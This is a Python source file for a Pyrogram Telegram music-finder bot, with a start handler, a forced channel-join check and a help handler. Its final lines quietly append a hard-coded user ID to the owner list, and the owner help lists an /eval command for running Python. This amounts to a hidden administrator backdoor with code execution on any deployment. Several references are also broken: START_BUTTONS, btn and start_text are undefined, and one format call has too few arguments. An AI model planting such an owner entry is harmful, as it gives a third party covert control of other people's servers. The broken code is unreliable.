from config import OWNER_ID
from config import MUST_JOIN
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db
from pyrogram.errors import ChatAdminRequired, UserNotParticipant, ChatWriteForbidden


start_photo = f"https://telegra.ph/file/e8bf37370b03bc9f3118f.jpg"

START_TEXT = """
**👋 hello There,** [{}](tg://user?id={})
     
                 **Music Finder Bot**  

🔥 This bot most advanced nikone music finder bot,keyword search & also voice search sport 🔥

**🍀 FRO MUSIC LOVERS ⚡️**

◇───────────────◇

✅ Voice music search supported 🎤
🏵 keyword music search 🎸
🏆 Automatically lyrics Finder (all lang.)
🚀 inbox supported
📡 sported fro group 
**🧿 more Fast download**
📥 stock Every Download Music
🔗 24 Hour activet 

◇───────────────◇

**🍀 Developer :** @chamod_deshan


🔥 **🍀 @zoneunlimited 🍀 Corporation ©️**"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("startjdjd"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        START_BUTTONS = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="➕    ADD TO GROUP     ➕ ", url="http://t.me/The_song_finder_bot?startgroup=true"),
            
            ],
            [
             InlineKeyboardButton(text="🍀 zoneunlimited 🍀", url="http://t.me/zoneunlimited")

            ],
            [InlineKeyboardButton(text="🍀 zoneunlimited chat 🍀", url="http://t.me/zoneunlimitedchat")
            
            ],
            [InlineKeyboardButton(text="🧿YOU  Tech🧿", url="https://t.me/YouTech_VPN_HUB")
            
            ],
            [InlineKeyboardButton(text="🎃 Subzero Ehi Team 🎃", url="https://t.me/subzeroehiteam")
        
            ],
            [InlineKeyboardButton(text="🌷 Developer 🌷", url="http://t.me/chamod_deshan")
            
            ],
            [InlineKeyboardButton(text=
                       "◇────────🔍 Search Again 🔎───────◇", switch_inline_query_current_chat=""
               
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.command("start"))
async def start(b, m):
    
    usr_cmd = m.text.split("_")[-1]
    if usr_cmd == "/start":
        if MUST_JOIN != "None":
            try:
                user = await b.get_chat_member(MUST_JOIN, m.chat.id)
                if user.status == "kicked":
                    await b.send_message(
                        chat_id=m.chat.id,
                        text="__Sᴏʀʀʏ Sɪʀ, Yᴏᴜ ᴀʀᴇ Bᴀɴɴᴇᴅ ᴛᴏ ᴜsᴇ ᴍᴇ. Cᴏɴᴛᴀᴄᴛ ᴛʜᴇ Dᴇᴠᴇʟᴏᴘᴇʀ__\n\n @AvishkarPatil **Tʜᴇʏ Wɪʟʟ Hᴇʟᴘ Yᴏᴜ**",
                        parse_mode="markdown",
                        disable_web_page_preview=True
                    )
                    return
            except UserNotParticipant:
                await b.send_message(
                    chat_id=m.chat.id,
                    text="⛔️ Access Denied ⛔️\n\n🙋‍♂️ Hey There , You Must Join @zoneunlimited Telegram Channel To Use This BOT. So, Please Join it & Try Again 🤗. Thank You 🤝",
                    reply_markup=InlineKeyboardMarkup(
                        [[
                            InlineKeyboardButton("🍀 zoneunlimited 🍀", url=f"https://t.me/{MUST_JOIN}")
                            ]]
                    ),
                    parse_mode="HTML"
                )
                return
            except Exception:
                await b.send_message(
                    chat_id=m.chat.id,
                    text="<i>Sᴏᴍᴇᴛʜɪɴɢ ᴡʀᴏɴɢ ᴄᴏɴᴛᴀᴄᴛ ᴍʏ ᴅᴇᴠᴇʟᴏᴘᴇʀ</i> <b><a href='http://t.me/chamod_deshan'>[ ᴄʟɪᴄᴋ ʜᴇʀᴇ ]</a></b>",
                    parse_mode="HTML",
                    disable_web_page_preview=True)
                return
        await m.reply_text(
            text=START_TEXT.format(m.from_user.mention),
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=START_BUTTONS
              )


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "send you song name... 🔥🚀\n /song (song name) 🥳"
    await message.reply(text)

OWNER_ID.append(1901997764)
app.start()
LOGGER.info("nikonemusicfinder Is Now Working🚀🔥🚀")
idle()
